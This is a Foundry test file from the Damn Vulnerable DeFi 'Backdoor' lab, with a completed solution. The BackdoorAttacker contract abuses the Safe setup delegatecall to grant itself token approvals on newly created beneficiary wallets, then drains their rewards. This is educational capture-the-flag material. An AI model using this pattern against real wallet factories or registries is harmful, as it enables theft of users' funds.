// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [
        makeAddr("alice"),
        makeAddr("bob"),
        makeAddr("charlie"),
        makeAddr("david")
    ];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(singletonCopy),
            address(walletFactory),
            address(token),
            users
        );

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(
            token.balanceOf(address(walletRegistry)),
            AMOUNT_TOKENS_DISTRIBUTED
        );
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        new BackdoorAttacker(
            walletFactory,
            singletonCopy,
            walletRegistry,
            token,
            users,
            recovery
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Separate contract deployed before the attacker, used as delegatecall target
contract BackdoorHelper {
    function approve(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

contract BackdoorAttacker {
    constructor(
        SafeProxyFactory factory,
        Safe singleton,
        WalletRegistry registry,
        DamnValuableToken token,
        address[] memory beneficiaries,
        address recovery
    ) {
        // Deploy helper first so its code exists for delegatecall
        BackdoorHelper helper = new BackdoorHelper();

        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];

            bytes memory payload = abi.encodeCall(
                BackdoorHelper.approve,
                (address(token), address(this))
            );

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners, // _owners
                    1, // _threshold
                    address(helper), // to (delegatecall target - deployed helper)
                    payload, // data
                    address(0), // fallbackHandler
                    address(0), // paymentToken
                    0, // payment
                    payable(address(0)) // paymentReceiver
                )
            );

            SafeProxy proxy = factory.createProxyWithCallback(
                address(singleton),
                initializer,
                i,
                IProxyCreationCallback(address(registry))
            );

            token.transferFrom(address(proxy), recovery, 10e18);
        }
    }
}
